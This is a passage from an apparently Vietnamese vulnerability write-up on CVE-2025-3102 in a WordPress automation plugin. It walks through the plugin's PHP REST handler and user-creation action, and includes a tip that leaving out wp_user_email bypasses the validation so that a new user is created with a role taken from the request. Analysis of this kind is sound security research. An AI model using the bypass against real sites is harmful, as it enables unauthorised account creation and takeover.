<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">RestController.php v1.0.78</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="hl"><span class="lnt">57
</span></span><span class="hl"><span class="lnt">58
</span></span><span class="hl"><span class="lnt">59
</span></span><span class="hl"><span class="lnt">60
</span></span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">run_action</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;wp_user_id&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user_id</span>          <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;wp_user_id&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$automation_id</span>    <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;automation_id&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$integration</span>      <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;integration&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$action_type</span>      <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;type_event&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$selected_options</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;selected_options&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$context</span>          <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;context&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fields</span>           <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span> <span class="s1">&#39;fields&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$user_id</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_id</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$context</span><span class="p">[</span><span class="s1">&#39;pluggable_data&#39;</span><span class="p">][</span><span class="s1">&#39;wp_user_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$context</span><span class="p">[</span><span class="s1">&#39;pluggable_data&#39;</span><span class="p">][</span><span class="s1">&#39;wp_user_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$integration</span> <span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$action_type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="s1">&#39;Integration or action type is missing&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="p">(</span> <span class="s1">&#39;EDD&#39;</span> <span class="o">===</span> <span class="nv">$integration</span> <span class="o">&amp;&amp;</span> <span class="s1">&#39;find_user_purchased_download&#39;</span> <span class="o">===</span> <span class="nv">$action_type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$is_valid</span> <span class="o">=</span> <span class="nx">WordPress</span><span class="o">::</span><span class="na">validate_email</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$is_valid</span><span class="o">-&gt;</span><span class="na">valid</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nv">$is_valid</span><span class="o">-&gt;</span><span class="na">multiple</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="s1">&#39;One or more email address is not valid.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="s1">&#39;Email address is not valid.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">str_contains</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">],</span> <span class="s1">&#39;,&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$email_list</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$email_list</span> <span class="k">as</span> <span class="nv">$single_email</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">email_exists</span><span class="p">(</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$single_email</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="s1">&#39;User with email &#39;</span> <span class="o">.</span> <span class="nv">$single_email</span> <span class="o">.</span> <span class="s1">&#39; does not exists.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">email_exists</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="s1">&#39;User with email &#39;</span> <span class="o">.</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;wp_user_email&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39; does not exists.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$registered_actions</span> <span class="o">=</span> <span class="nx">EventController</span><span class="o">::</span><span class="na">get_instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">actions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$action_event</span>       <span class="o">=</span> <span class="nv">$registered_actions</span><span class="p">[</span> <span class="nv">$integration</span> <span class="p">][</span> <span class="nv">$action_type</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$fun_params</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$automation_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fields</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$selected_options</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$context</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
</span></span><span class="line hl"><span class="cl">            <span class="nv">$action_event</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">],</span>
</span></span><span class="line hl"><span class="cl">            <span class="nv">$fun_params</span>
</span></span><span class="line hl"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">success_message</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span> <span class="nx">Exception</span> <span class="nv">$e</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">error_message</span><span class="p">(</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">(),</span> <span class="mi">400</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <code>run_action()</code> bắt đầu bằng việc trích xuất các tham số cần thiết thông qua <code>$request-&gt;get_param()</code>.</p>
<p>Nếu <code>wp_user_id</code> không được truyền trực tiếp, hệ thống fallback sang giá trị trong <code>context['pluggable_data']['wp_user_id']</code>. Điều này giúp đảm bảo luôn có user context để xử lý hành động.</p>
<p>Tiếp theo, hệ thống kiểm tra dữ liệu bắt buộc. Nếu <code>integration</code> hoặc <code>type_event</code> bị thiếu, hàm sẽ dừng ngay và trả về lỗi. Sau đó, nếu tồn tại <code>selected_options['wp_user_email']</code>, hệ thống tiến hành validate email: kiểm tra định dạng hợp lệ, tách danh sách email nếu có nhiều giá trị, và xác minh email có tồn tại trong WordPress hay không.</p>
<div class="alert alert-tip"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z"/></svg>Mẹo</p><p>Ta có thể không truyền <code>wp_user_email</code> để bypass qua kiểm tra này</p></div><p>Sau khi vượt qua toàn bộ bước kiểm tra dữ liệu, hệ thống lấy danh sách action đã đăng ký thông qua Singleton:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">EventController</span><span class="o">::</span><span class="na">get_instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">actions</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Danh sách này là một mảng ánh xạ giữa <code>integration</code> và <code>action_type</code>, trong đó mỗi action chứa một callable function tương ứng.</p>
<p>Dựa trên giá trị <code>integration</code> và <code>type_event</code> từ request, hệ thống xác định action cần thực thi:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$action_event</span> <span class="o">=</span> <span class="nv">$registered_actions</span><span class="p">[</span><span class="nv">$integration</span><span class="p">][</span><span class="nv">$action_type</span><span class="p">];</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Callable function được trích xuất từ:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$action_event</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">]</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Tiếp theo, các tham số truyền vào function được đóng gói trong mảng:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$user_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nv">$automation_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nv">$fields</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nv">$selected_options</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nv">$context</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Cuối cùng, hàm đích được gọi động bằng:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$action_event</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">],</span> <span class="nv">$fun_params</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Cơ chế này cho phép hệ thống thực thi linh hoạt nhiều action khác nhau chỉ dựa trên dữ liệu truyền từ request, thay vì hard-code từng hàm cụ thể. Kết quả trả về từ function sẽ được đóng gói thành response thành công, hoặc trả lỗi nếu quá trình thực thi phát sinh exception.</p>
<p>Điều thực sự điên rồ khi <code>integration</code> là <code>WordPress</code> và <code>create_user_if_not_exists</code> thì hành động tạo user mới nếu user chưa tồn tại sẽ được triển khai.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-14-cve-2025-3102/new_user.png" title="New user" data-thumbnail="/posts/2026-01-14-cve-2025-3102/new_user.png" data-sub-html="<h2>New user</h2><p>New user</p>"><img loading="lazy" src='/posts/2026-01-14-cve-2025-3102/new_user.png' alt="New user" height="692" width="1488"></a><figcaption class="image-caption">New user</figcaption>
  </figure></p>
<p>Khi <code>call_user_func_array</code> được gọi, <code>_action_listener</code> sẽ được kích hoạt:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="create-user-if-not-exists.php v1.0.78" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">create-user-if-not-exists.php v1.0.78</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="hl"><span class="lnt">33
</span></span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">_action_listener</span><span class="p">(</span> <span class="nv">$user_id</span><span class="p">,</span> <span class="nv">$automation_id</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="nv">$selected_options</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$email</span>     <span class="o">=</span> <span class="nx">sanitize_email</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;user_email&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * User Data
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$user_pass</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">wp_generate_password</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$userdata</span>               <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_login&#39;</span> <span class="o">=&gt;</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_email&#39;</span> <span class="o">=&gt;</span> <span class="nv">$email</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;first_name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;first_name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;last_name&#39;</span>  <span class="o">=&gt;</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;last_name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_pass&#39;</span>  <span class="o">=&gt;</span> <span class="nv">$user_pass</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;role&#39;</span>       <span class="o">=&gt;</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$force_update_user_role</span> <span class="o">=</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;force_update_user_role&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;yes&#39;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
